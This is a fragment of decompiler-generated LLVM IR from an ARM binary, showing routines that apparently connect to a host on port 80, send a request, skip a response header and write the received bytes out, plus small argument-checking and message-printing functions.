  %v2_8f30 = icmp eq i32 %v5_8f28, 0
  br i1 %v2_8f30, label %dec_label_pc_8f38, label %dec_label_pc_8f6c

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f04
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_8f44 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f48 = add i32 %v4_8f44, 4
  %v1_8f4c = inttoptr i32 %v1_8f48 to i32*
  %v2_8f4c = load i32, i32* %v1_8f4c, align 4
  %v1_8f50 = add i32 %v2_8f4c, 7
  %v2_8f58 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v1_8f50, i32* %r1.global-to-local, align 4
  %v2_8f64 = inttoptr i32 %v1_8f50 to i8*
  %v3_8f64 = call i32 @function_f090(i32 %v2_8f58, i8* %v2_8f64)
  br label %dec_label_pc_8f98

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f04
  %v4_8f78 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f7c = add i32 %v4_8f78, 4
  %v1_8f80 = inttoptr i32 %v1_8f7c to i32*
  %v2_8f80 = load i32, i32* %v1_8f80, align 4
  %v2_8f88 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_8f80, i32* %r1.global-to-local, align 4
  %v2_8f94 = inttoptr i32 %v2_8f80 to i8*
  %v3_8f94 = call i32 @function_f090(i32 %v2_8f88, i8* %v2_8f94)
  br label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f38, %dec_label_pc_8f6c
  %v2_8fb8.pre-phi = phi i32 [ %v2_8f58, %dec_label_pc_8f38 ], [ %v2_8f88, %dec_label_pc_8f6c ]
  br label %dec_label_pc_8fb0

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8fd0
  %v1_8fa8 = add i32 %storemerge5, 1
  br label %dec_label_pc_8fb0

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8fa4
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8f98 ], [ %v1_8fa8, %dec_label_pc_8fa4 ]
  store i32 %storemerge5, i32* @r4, align 4
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v0_8fc0 = call i32 @function_f030()
  %v0_8fc8 = load i32, i32* @r4, align 4
  %v3_8fc8 = icmp ult i32 %v0_8fc8, %v0_8fc0
  br i1 %v3_8fc8, label %dec_label_pc_8fd0, label %dec_label_pc_8ff4

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_8fe0 = add i32 %storemerge5, %v16_8df8
  %v2_8fe4 = add i32 %v2_8fe0, -1084
  %v1_8fe8 = inttoptr i32 %v2_8fe4 to i8*
  %v2_8fe8 = load i8, i8* %v1_8fe8, align 1
  %v7_8fec = icmp eq i8 %v2_8fe8, 47
  br i1 %v7_8fec, label %dec_label_pc_8ff4, label %dec_label_pc_8fa4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8fb0, %dec_label_pc_8fd0
  %v2_9004 = add i32 %v16_8df8, -1084
  %v2_9008 = add i32 %v2_9004, %storemerge5
  %v3_9010 = inttoptr i32 %v2_9008 to i8*
  store i8 0, i8* %v3_9010, align 1
  store i32 2, i32* %stack_var_-80, align 4
  %v1_9028 = call i32 @function_f604(i32 80)
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v1_9048 = call i32 @function_f730(i32 %v2_8fb8.pre-phi)
  %v3_9058 = icmp eq i32 %v1_9048, -1
  br i1 %v3_9058, label %dec_label_pc_9060, label %dec_label_pc_90e0

dec_label_pc_9060:                                ; preds = %dec_label_pc_8ff4
  %v1_906c = call i32 @function_f754(i32 %v2_8fb8.pre-phi)
  %v2_907c = icmp eq i32 %v1_906c, 0
  br i1 %v2_907c, label %dec_label_pc_9084, label %dec_label_pc_90b4

dec_label_pc_9084:                                ; preds = %dec_label_pc_9060
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_9098 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_15d1c.51 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_90a8 = call i32 @function_8374(i32 %v4_9098, i32 ptrtoint ([39 x i8]* @global_var_15d1c.51 to i32))
  %v1_90b0 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_90b4

dec_label_pc_90b4:                                ; preds = %dec_label_pc_9060, %dec_label_pc_9084
  %v2_90b8 = ptrtoint i32* %stack_var_-76 to i32
  %v1_90c0 = add i32 %v1_906c, 16
  %v2_90c0 = inttoptr i32 %v1_90c0 to i32*
  %v3_90c0 = load i32, i32* %v2_90c0, align 4
  %v1_90c4 = inttoptr i32 %v3_90c0 to i32*
  %v2_90c4 = load i32, i32* %v1_90c4, align 4
  store i32 %v2_90c4, i32* @r1, align 4
  %v1_90cc = add i32 %v1_906c, 12
  %v2_90cc = inttoptr i32 %v1_90cc to i32*
  %v3_90cc = load i32, i32* %v2_90cc, align 4
  store i32 %v2_90b8, i32* @r0, align 4
  store i32 %v3_90cc, i32* @r2, align 4
  %v0_90d8 = call i32 @function_ef60()
  br label %dec_label_pc_90e8

dec_label_pc_90e0:                                ; preds = %dec_label_pc_8ff4
  store i32 %v1_9048, i32* %stack_var_-76, align 4
  br label %dec_label_pc_90e8

dec_label_pc_90e8:                                ; preds = %dec_label_pc_90b4, %dec_label_pc_90e0
  %v2_90e8.pre-phi = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_90e8.pre-phi, i32* %r1.global-to-local, align 4
  %v3_9110 = bitcast i32* %stack_var_-80 to %sockaddr*
  %v4_9110 = call i32 @function_fb64(i32 %v3_8ebc, %sockaddr* %v3_9110, i32 16)
  %v2_9118 = icmp eq i32 %v4_9110, 0
  br i1 %v2_9118, label %dec_label_pc_9150, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_90e8
  %v4_9134 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_15d44.53 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9144 = call i32 @function_8374(i32 %v4_9134, i32 ptrtoint ([39 x i8]* @global_var_15d44.53 to i32))
  %v1_914c = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_90e8, %dec_label_pc_9120
  %v2_9160 = add i32 %v2_8fb8.pre-phi, 1
  %v1_9164 = add i32 %v2_9160, %storemerge5
  store i32 %v1_9164, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_15d6c.55 to i32), i32* %r1.global-to-local, align 4
  %v3_9178 = call i32 @function_8374(i32 %v3_8ebc, i32 ptrtoint ([276 x i8]* @global_var_15d6c.55 to i32))
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_9190 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([28 x i8]* @global_var_15e80.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91a0 = call i32 @function_8374(i32 %v4_9190, i32 ptrtoint ([28 x i8]* @global_var_15e80.57 to i32))
  %v4_91b0 = load i32, i32* %stack_var_-5216, align 4
  %v1_91b4 = add i32 %v4_91b0, 8
  %v1_91b8 = inttoptr i32 %v1_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15e9c.59 to i32), i32* @r1, align 4
  %v3_91c4 = call i32 @function_d050(i32 %v2_91b8, i32 ptrtoint ([3 x i8]* @global_var_15e9c.59 to i32))
  %v2_91d8 = ptrtoint i32* %stack_var_-5200 to i32
  %v2_9228 = add i32 %v16_8df8, -5180
  br label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %dec_label_pc_9364, %dec_label_pc_9150
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_91ec = call i32 @function_fbbc(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp56 = icmp slt i32 %v5_91ec, 1
  br i1 %tmp56, label %dec_label_pc_9384.loopexit9, label %dec_label_pc_9204

dec_label_pc_9204:                                ; preds = %dec_label_pc_91d0
  %v8_9214 = icmp sgt i32 %v5_91ec, 4095
  br i1 %v8_9214, label %dec_label_pc_9244.lr.ph, label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %dec_label_pc_9204
  %v2_922c = add i32 %v5_91ec, %v2_9228
  %v3_9234 = inttoptr i32 %v2_922c to i8*
  store i8 0, i8* %v3_9234, align 1
  br label %dec_label_pc_9244.lr.ph

dec_label_pc_9244.lr.ph:                          ; preds = %dec_label_pc_9218, %dec_label_pc_9204
  br label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_9244.lr.ph, %dec_label_pc_9364
  %storemerge691 = phi i32 [ 0, %dec_label_pc_9244.lr.ph ], [ %v1_9368, %dec_label_pc_9364 ]
  %v2_9258 = add i32 %storemerge691, %v2_91d8
  store i32 ptrtoint ([5 x i8]* @global_var_15ea0.61 to i32), i32* @r1, align 4
  %v4_9268 = inttoptr i32 %v2_9258 to i8*
  %v5_9268 = call i32 @function_f0ac(i8* %v4_9268, i32 ptrtoint ([5 x i8]* @global_var_15ea0.61 to i32), i32 4)
  %v2_9270 = icmp eq i32 %v5_9268, 0
  br i1 %v2_9270, label %dec_label_pc_9278, label %dec_label_pc_9364

dec_label_pc_9278:                                ; preds = %dec_label_pc_9244
  %v1_927c = add i32 %storemerge691, 4
  %v1_9294 = add i32 %v3_91c4, 52
  %v2_9294 = inttoptr i32 %v1_9294 to i32*
  %v1_92a4 = add i32 %v3_91c4, 16
  %v2_92a4 = inttoptr i32 %v1_92a4 to i32*
  %v1_92ac = add i32 %v3_91c4, 28
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v5_935c80 = icmp slt i32 %v1_927c, %v5_91ec
  br i1 %v5_935c80, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9288:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344
  %storemerge781 = phi i32 [ %v1_9348, %dec_label_pc_9344 ], [ %v1_927c, %dec_label_pc_9278 ]
  %v3_9294 = load i32, i32* %v2_9294, align 4
  %v2_9298 = icmp eq i32 %v3_9294, 0
  br i1 %v2_9298, label %dec_label_pc_931c, label %dec_label_pc_92a0

dec_label_pc_92a0:                                ; preds = %dec_label_pc_9288
  %v3_92a4 = load i32, i32* %v2_92a4, align 4
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v3_92b0 = icmp ult i32 %v3_92a4, %v3_92ac
  br i1 %v3_92b0, label %dec_label_pc_92b8, label %dec_label_pc_92f0

dec_label_pc_92b8:                                ; preds = %dec_label_pc_92a0
  %v3_92bc = load i32, i32* %v2_92a4, align 4
  store i32 %v3_92bc, i32* %r1.global-to-local, align 4
  %v2_92d0 = add i32 %storemerge781, %v16_8df8
  %v2_92d4 = add i32 %v2_92d0, -5180
  %v1_92d8 = inttoptr i32 %v2_92d4 to i8*
  %v2_92d8 = load i8, i8* %v1_92d8, align 1
  %v3_92dc = inttoptr i32 %v3_92bc to i8*
  store i8 %v2_92d8, i8* %v3_92dc, align 1
  %v0_92e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_92e0 = add i32 %v0_92e0, 1
  store i32 %v1_92e0, i32* %v2_92a4, align 4
  br label %dec_label_pc_9344

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92a0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_9300 = add i32 %storemerge781, %v16_8df8
  %v2_9304 = add i32 %v2_9300, -5180
  %v1_9308 = inttoptr i32 %v2_9304 to i8*
  %v2_9308 = load i8, i8* %v1_9308, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9314 = call i32 @function_ed64(i8 %v2_9308, i32 %v3_91c4, i32 %v2_9300)
  br label %dec_label_pc_9344

dec_label_pc_931c:                                ; preds = %dec_label_pc_9288
  %v2_932c = add i32 %storemerge781, %v16_8df8
  %v2_9330 = add i32 %v2_932c, -5180
  %v1_9334 = inttoptr i32 %v2_9330 to i8*
  %v2_9334 = load i8, i8* %v1_9334, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9340 = call i32 @function_e850(i8 %v2_9334, i32 %v3_91c4, i32 %v2_932c)
  br label %dec_label_pc_9344

dec_label_pc_9344:                                ; preds = %dec_label_pc_92f0, %dec_label_pc_92b8, %dec_label_pc_931c
  %v1_9348 = add i32 %storemerge781, 1
  %v5_935c = icmp slt i32 %v1_9348, %v5_91ec
  br i1 %v5_935c, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9364:                                ; preds = %dec_label_pc_9244
  %v1_9368 = add nuw nsw i32 %storemerge691, 1
  %v5_937c = icmp slt i32 %v1_9368, %v5_91ec
  br i1 %v5_937c, label %dec_label_pc_9244, label %dec_label_pc_91d0

dec_label_pc_9384.loopexit9:                      ; preds = %dec_label_pc_91d0
  %.pre17 = add i32 %v3_91c4, 52
  %.pre18 = inttoptr i32 %.pre17 to i32*
  %.pre19 = add i32 %v3_91c4, 16
  %.pre20 = inttoptr i32 %.pre19 to i32*
  %.pre21 = add i32 %v3_91c4, 28
  %.pre22 = inttoptr i32 %.pre21 to i32*
  br label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344, %dec_label_pc_9384.loopexit9
  %v2_9460.pre-phi = phi i32* [ %.pre22, %dec_label_pc_9384.loopexit9 ], [ %v2_92ac, %dec_label_pc_9344 ], [ %v2_92ac, %dec_label_pc_9278 ]
  %v2_9458.pre-phi = phi i32* [ %.pre20, %dec_label_pc_9384.loopexit9 ], [ %v2_92a4, %dec_label_pc_9344 ], [ %v2_92a4, %dec_label_pc_9278 ]
  %v2_9448.pre-phi = phi i32* [ %.pre18, %dec_label_pc_9384.loopexit9 ], [ %v2_9294, %dec_label_pc_9344 ], [ %v2_9294, %dec_label_pc_9278 ]
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_93b0 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_15ea8.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_93c4 = call i32 @function_8374(i32 %v4_93b0, i32 ptrtoint ([24 x i8]* @global_var_15ea8.63 to i32))
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9384
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_93e4 = call i32 @function_fbbc(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v5_93e4, 1
  br i1 %tmp58, label %dec_label_pc_9518, label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93c8
  %v8_940c = icmp sgt i32 %v5_93e4, 4095
  br i1 %v8_940c, label %dec_label_pc_943c.lr.ph, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_93fc
  store i32 %v16_8df8, i32* @ip, align 4
  %v2_9424 = add i32 %v5_93e4, %v2_9228
  %v3_942c = inttoptr i32 %v2_9424 to i8*
  store i8 0, i8* %v3_942c, align 1
  br label %dec_label_pc_943c.lr.ph

dec_label_pc_943c.lr.ph:                          ; preds = %dec_label_pc_9410, %dec_label_pc_93fc
  br label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_943c.lr.ph, %dec_label_pc_94f8
  %storemerge871 = phi i32 [ 0, %dec_label_pc_943c.lr.ph ], [ %v1_94fc, %dec_label_pc_94f8 ]
  %v3_9448 = load i32, i32* %v2_9448.pre-phi, align 4
  %v2_944c = icmp eq i32 %v3_9448, 0
  br i1 %v2_944c, label %dec_label_pc_94d0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_943c
  %v3_9458 = load i32, i32* %v2_9458.pre-phi, align 4
  %v3_9460 = load i32, i32* %v2_9460.pre-phi, align 4
  %v3_9464 = icmp ult i32 %v3_9458, %v3_9460
  br i1 %v3_9464, label %dec_label_pc_946c, label %dec_label_pc_94a4

dec_label_pc_946c:                                ; preds = %dec_label_pc_9454
  %v3_9470 = load i32, i32* %v2_9458.pre-phi, align 4
  store i32 %v3_9470, i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  %v2_9484 = add i32 %storemerge871, %v16_8df8
  %v2_9488 = add i32 %v2_9484, -5180
  %v1_948c = inttoptr i32 %v2_9488 to i8*
  %v2_948c = load i8, i8* %v1_948c, align 1
  %v3_9490 = inttoptr i32 %v3_9470 to i8*
  store i8 %v2_948c, i8* %v3_9490, align 1
  %v0_9494 = load i32, i32* %r1.global-to-local, align 4
  %v1_9494 = add i32 %v0_9494, 1
  store i32 %v1_9494, i32* %v2_9458.pre-phi, align 4
  br label %dec_label_pc_94f8

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9454
  %v2_94b4 = add i32 %storemerge871, %v16_8df8
  %v2_94b8 = add i32 %v2_94b4, -5180
  %v1_94bc = inttoptr i32 %v2_94b8 to i8*
  %v2_94bc = load i8, i8* %v1_94bc, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94c8 = call i32 @function_ed64(i8 %v2_94bc, i32 %v3_91c4, i32 %v2_94b4)
  br label %dec_label_pc_94f8

dec_label_pc_94d0:                                ; preds = %dec_label_pc_943c
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_94e0 = add i32 %storemerge871, %v16_8df8
  %v2_94e4 = add i32 %v2_94e0, -5180
  %v1_94e8 = inttoptr i32 %v2_94e4 to i8*
  %v2_94e8 = load i8, i8* %v1_94e8, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94f4 = call i32 @function_e850(i8 %v2_94e8, i32 %v3_91c4, i32 %v2_94e0)
  br label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94a4, %dec_label_pc_946c, %dec_label_pc_94d0
  %v1_94fc = add nuw nsw i32 %storemerge871, 1
  %v5_9510 = icmp slt i32 %v1_94fc, %v5_93e4
  br i1 %v5_9510, label %dec_label_pc_943c, label %dec_label_pc_93c8

dec_label_pc_9518:                                ; preds = %dec_label_pc_93c8
  %v1_951c = inttoptr i32 %v3_91c4 to i8*
  %v2_951c = call i32 @function_ced0(i8* %v1_951c)
  %v1_9524 = call i32 @function_cbe4(i32 %v3_8ebc)
  %v1_952c = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_9530

dec_label_pc_9530:                                ; preds = %dec_label_pc_8df4, %dec_label_pc_9518
  %v12_9534 = phi i32 [ %v1_8e58, %dec_label_pc_8df4 ], [ %v1_952c, %dec_label_pc_9518 ]
  ret i32 %v12_9534

; uselistorder directives
  uselistorder i32 %storemerge871, { 0, 3, 2, 1 }
  uselistorder i32 %v5_93e4, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9458.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_9348, { 1, 0 }
  uselistorder i32 %storemerge781, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge691, { 1, 0, 2 }
  uselistorder i32 %v5_91ec, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_91d8, { 1, 0, 2 }
  uselistorder i32 %v3_91c4, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8fb8.pre-phi, { 0, 4, 2, 3, 1 }
  uselistorder i32* %v4_8e14, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %v16_8df8, { 0, 15, 1, 2, 14, 13, 16, 17, 3, 4, 12, 5, 7, 18, 11, 19, 8, 6, 10, 20, 21, 9, 22, 23, 24 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 -5180, { 4, 5, 6, 1, 2, 3, 0 }
  uselistorder i32 -1084, { 0, 2, 3, 4, 1 }
  uselistorder i32 (i8*, i32, i32)* @function_f0ac, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_9530, { 1, 0 }
  uselistorder label %dec_label_pc_94f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_943c, { 1, 0 }
  uselistorder label %dec_label_pc_9384, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9288, { 1, 0 }
  uselistorder label %dec_label_pc_9244, { 1, 0 }
  uselistorder label %dec_label_pc_9150, { 1, 0 }
  uselistorder label %dec_label_pc_90e8, { 1, 0 }
  uselistorder label %dec_label_pc_90b4, { 1, 0 }
  uselistorder label %dec_label_pc_8ff4, { 1, 0 }
  uselistorder label %dec_label_pc_8fb0, { 1, 0 }
  uselistorder label %dec_label_pc_8f98, { 1, 0 }
  uselistorder label %dec_label_pc_8f04, { 1, 0 }
  uselistorder label %dec_label_pc_8eb0, { 1, 0 }
}

define i32 @function_9560(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9560:
  %tmp25 = call i8 @__decompiler_undefined_function_2()
  %tmp26 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  store i32 38252, i32* %stack_var_-4, align 4
  %v2_9568 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9568, i32* @fp, align 4
  %v2_9590 = load i32, i32* @global_var_20644.35, align 4
  %v7_95b0 = icmp eq i32 %v2_9590, 1
  br i1 %v7_95b0, label %dec_label_pc_95b8, label %dec_label_pc_9614

dec_label_pc_95b8:                                ; preds = %dec_label_pc_9560
  store i32 %arg2, i32* @r2, align 4
  %v3_960c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_15ec0.67 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_9614:                                ; preds = %dec_label_pc_9560
  %v2_9584 = load i8*, i8** @global_var_20640.33, align 4
  %v3_9584 = ptrtoint i8* %v2_9584 to i32
  store i32 %v3_9584, i32* @lr, align 4
  %v3_9658 = sext i8 %tmp26 to i32
  store i32 %v3_9658, i32* @r4, align 4
  %v3_9668 = sext i8 %tmp25 to i32
  store i32 %v3_9668, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96b4 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_15ee0.69 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_95b8, %dec_label_pc_9614
  %storemerge = phi i32 [ %v3_96b4, %dec_label_pc_9614 ], [ %v3_960c, %dec_label_pc_95b8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @function_96d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96d0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38620, i32* %stack_var_-4, align 4
  %v2_96d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_96d8, i32* @fp, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_15f10.71 to i32))
  ret i32 %v3_96fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_970c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_970c:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38680, i32* %stack_var_-4, align 4
  %v2_9714 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9714, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_9730 = icmp eq i32 %arg3, 1
  br i1 %v7_9730, label %dec_label_pc_974c, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  store i32 %arg2, i32* @r2, align 4
  %v3_9744 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_15f30.73 to i32))
  br label %dec_label_pc_979c

dec_label_pc_974c:                                ; preds = %dec_label_pc_970c
  %v1_9750 = add i32 %arg4, 4
  %v1_9754 = inttoptr i32 %v1_9750 to i32*
  %v2_9754 = load i32, i32* %v1_9754, align 4
  store i32 %v2_9754, i32* @r0, align 4
  %v0_975c = call i32 @function_f030()
  %tmp = icmp ult i32 %v0_975c, 10
  br i1 %tmp, label %dec_label_pc_9780, label %dec_label_pc_976c

dec_label_pc_976c:                                ; preds = %dec_label_pc_974c
  store i32 %arg2, i32* @r2, align 4
  %v3_9778 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_15f48.75 to i32))
  br label %dec_label_pc_979c

dec_label_pc_9780:                                ; preds = %dec_label_pc_974c
  %v3_9780 = load i32, i32* %stack_var_-32, align 4
  %v1_9784 = add i32 %v3_9780, 4
  %v1_9788 = inttoptr i32 %v1_9784 to i32*
  %v2_9788 = load i32, i32* %v1_9788, align 4
  store i32 %v2_9788, i32* @r2, align 4
  %v3_9798 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_15f80.77 to i32))
  br label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_976c, %dec_label_pc_9738, %dec_label_pc_9780
  %v9_97a0 = phi i32 [ %v3_9778, %dec_label_pc_976c ], [ %v3_9744, %dec_label_pc_9738 ], [ %v3_9798, %dec_label_pc_9780 ]
  ret i32 %v9_97a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_979c, { 2, 0, 1 }
}

define i32 @function_97b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_97b0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38844, i32* %stack_var_-4, align 4
  %v2_97b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97b8, i32* @fp, align 4
  %v7_97d4 = icmp eq i32 %arg3, 1
  br i1 %v7_97d4, label %dec_label_pc_9828, label %dec_label_pc_97dc

dec_label_pc_97dc:                                ; preds = %dec_label_pc_97b0
  store i32 %arg2, i32* @r2, align 4
  %v3_97e8 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_15f8c.79 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9820 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_15fd0.86 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9828:                                ; preds = %dec_label_pc_97b0
  %v2_982c = load i8, i8* bitcast (i8** @global_var_2063c.23 to i8*), align 4
  %v2_9830 = icmp eq i8 %v2_982c, 0
  br i1 %v2_9830, label %dec_label_pc_984c, label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9828
  store i32 %arg2, i32* @r2, align 4
  %v3_9844 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_15ff4.88 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_984c:                                ; preds = %dec_label_pc_9828
  %v1_9850 = add i32 %arg4, 4
  %v1_9854 = inttoptr i32 %v1_9850 to i32*
  %v2_9854 = load i32, i32* %v1_9854, align 4
  store i32 %v2_9854, i32* @r0, align 4
  %v0_985c = call i32 @function_f030()
  %tmp = icmp ult i32 %v0_985c, 255
  br i1 %tmp, label %dec_label_pc_9880, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_984c
  store i32 %arg2, i32* @r2, align 4
  %v3_9878 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_16014.90 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9880:                                ; preds = %dec_label_pc_984c
  store i8 1, i8* bitcast (i8** @global_var_2063c.23 to i8*), align 4
  store i32 256, i32* @r2, align 4
  %v3_989c = call i32 @function_ef70(i8* bitcast (i32* @global_var_22cb8.92 to i8*), i32 0)
  %v2_98a8 = load i32, i32* %v1_9854, align 4
  %v2_98b4 = inttoptr i32 %v2_98a8 to i8*
  %v3_98b4 = call i32 @function_f090(i32 ptrtoint (i32* @global_var_22cb8.92 to i32), i8* %v2_98b4)
  %v3_98c0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1603c.94 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_986c, %dec_label_pc_9838, %dec_label_pc_97dc, %dec_label_pc_9880
